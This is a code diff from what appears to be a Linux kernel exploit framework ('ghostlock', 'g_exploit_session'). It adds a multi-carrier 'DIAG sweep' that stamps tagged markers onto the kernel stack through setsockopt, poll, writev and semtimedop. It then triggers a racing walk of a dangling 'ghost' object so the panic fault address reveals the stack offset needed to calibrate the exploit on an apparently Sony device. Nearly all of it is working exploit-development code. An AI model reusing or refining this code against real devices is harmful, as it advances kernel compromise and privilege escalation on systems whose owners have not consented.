@@ -1,4 +1,7 @@
 #include <netinet/in.h>
+#include <poll.h>
+#include <sys/uio.h>
+#include <cstring>
 #include <ctime>
 #include <unistd.h>
 
@@ -48,44 +51,80 @@ namespace ghostlock::route {
          * panicked shot therefore calibrates the Sony shift exactly, the
          * same way the upstream derived shift=21 from their m1 DIAG fire. */
         if (*layout.waiter_offset == 65535) {
-            /* v12.8: hard-code the carrier geometry instead of trusting the
-             * conf's buffer_size. The kernel copies exactly sizeof(struct
-             * group_source_req) = 264B (33 words) — upstream ships
-             * SLIDE_MCAST_GSR_WORDS=33 for the same reason. A conf that
-             * inflates buffer_size to 65615 only to satisfy the
-             * waiter_off+lock_offset+8 validator would otherwise be handed
-             * to setsockopt as optlen=65615, i.e. 65KB into a 264B kernel
-             * stack slot. */
-            const size_t kDiagBytes = 264;
-            const size_t words = kDiagBytes / 8;
-            unsigned char diag[kDiagBytes];
-            for (size_t j = 0; j < words; ++j) {
-                uint64_t marker = 0xD00D000000000000ULL | (static_cast<uint64_t>(j) * 8);
-                memcpy(diag + j * 8, &marker, sizeof(marker));
-            }
-            /* v12.8: do NOT clobber word1 with AF_UNSPEC. Word1's marker
-             * already carries an invalid sa_family (0x0008), so the kernel
-             * still rejects after copy_from_user — and every word keeps a
-             * distinct tag, so j=1 decodes instead of collapsing onto j=0. */
+            /* v12.9: multi-carrier DIAG sweep. Three shots (shift 23/7/3)
+             * all faulted on the same kstack residue tail (…3320), i.e. the
+             * ghost never fell inside the mcast gsr window at all — the
+             * Sony frame-depth delta may simply be larger than 264B, or
+             * negative (the ghost deeper than the gsr copy). Rather than
+             * burn one reboot per guess, sweep carriers whose verbatim
+             * stack copy sits at a DIFFERENT stack depth. A carrier whose
+             * window misses the ghost leaves the kernel alive (residue
+             * faults are the risk, but a miss that survives lets the next
+             * carrier run in the same boot), so the sweep tries all of
+             * them in one attempt and logs which one was in flight.
+             *
+             * Decoding: each word is tagged 0xD?DD0000000000|<j*8>. The
+             * walk dereferences the ghost's lock field, so the panic fault
+             * address IS the tag: carrier = the D?DD prefix,
+             * j = (far & 0xfff)/8, and the true waiter_off for that
+             * carrier = j*8 - 56 (field7 = lock lands at word j). */
+            struct diag_carrier {
+                const char *name;
+                uint64_t tag;
+                size_t bytes;
+            };
+            const diag_carrier carriers[] = {
+                    {"mcast",  0xD00D000000000000ULL, 264},  /* group_source_req, 33 words   */
+                    {"semop",  0xD11D000000000000ULL, 512},  /* 32 sembufs (SEMOPM=32)      */
+                    {"poll",   0xD22D000000000000ULL, 256},  /* nfds=32, POLL_STACK_ALLOC   */
+                    {"writev", 0xD33D000000000000ULL, 128},  /* UIO_FASTIOV=8 iovecs        */
+            };
+            const size_t kMax = 512;
+            unsigned char buf[kMax];
             int32_t dfd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-            if (dfd < 0) {
-                status.step = 62;
-                status.error_number = errno;
-                status.code = ROUTE_FALLBACK_SAFE;
-                return status;
+            int32_t seq = 0;
+            for (const diag_carrier &c: carriers) {
+                memset(buf, 0, sizeof(buf));
+                const size_t words = c.bytes / 8;
+                for (size_t j = 0; j < words; ++j) {
+                    const uint64_t marker = c.tag | (static_cast<uint64_t>(j) * 8);
+                    memcpy(buf + j * 8, &marker, sizeof(marker));
+                }
+                errno = 0;
+                if (strcmp(c.name, "mcast") == 0) {
+                    if (dfd >= 0)
+                        (void) setsockopt(dfd, IPPROTO_IPV6, 44, buf, (socklen_t) c.bytes);
+                } else if (strcmp(c.name, "poll") == 0) {
+                    (void) poll(reinterpret_cast<struct pollfd *>(buf),
+                                static_cast<nfds_t>(c.bytes / 8), 0);
+                } else if (strcmp(c.name, "writev") == 0) {
+                    if (dfd >= 0)
+                        (void) writev(dfd, reinterpret_cast<const struct iovec *>(buf),
+                                      c.bytes / sizeof(struct iovec));
+                } else {
+                    /* semtimedop: copy_from_user runs before the semid
+                     * lookup, so an invalid semid still lands the plant.
+                     * Zero timeout so it can never sleep. */
+                    struct timespec zero = {.tv_sec = 0, .tv_nsec = 0};
+                    (void) syscall(192, 0, buf, 32, &zero);
+                }
+                pr_info("mcast DIAG carrier=%s words=%zu errno=%d; firing walk\n",
+                        c.name, words, errno);
+                session::g_exploit_session.race.consumer_calls.store(0);
+                session::g_exploit_session.race.consumer_go.store(++seq);
+                for (int32_t spin = 0; spin < 100000000 &&
+                                       session::g_exploit_session.race.consumer_calls.load() == 0;
+                     spin++)
+                    __asm__ volatile ("yield" ::: "memory");
+                /* Give the chain time to deref and fault before moving on;
+                 * a hit panics us out of this loop entirely. */
+                for (volatile int32_t dwell = 0; dwell < 6000000; dwell++)
+                    __asm__ volatile ("yield" ::: "memory");
+                session::g_exploit_session.race.consumer_go.store(0);
+                pr_info("mcast DIAG carrier=%s survived (no overlap)\n", c.name);
             }
-            session::g_exploit_session.race.consumer_calls.store(0);
-            errno = 0;
-            (void) setsockopt(dfd, IPPROTO_IPV6, 44, diag, (socklen_t) kDiagBytes);
-            pr_info("mcast DIAG stamped %zu words (264B) errno=%d; awaiting "
-                    "consumer walk\n", words, errno);
-            session::g_exploit_session.race.consumer_go.store(1);
-            for (int32_t spin = 0; spin < 100000000 &&
-                                   session::g_exploit_session.race.consumer_calls.load() == 0;
-                 spin++)
-                __asm__ volatile ("yield" ::: "memory");
-            session::g_exploit_session.race.consumer_go.store(0);
-            close(dfd);
+            if (dfd >= 0) close(dfd);
+            pr_info("mcast DIAG sweep complete: no carrier overlapped the ghost\n");
             status.step = 0;
             status.userspace_clean = 1;
             status.kernel_disarmed = 1;
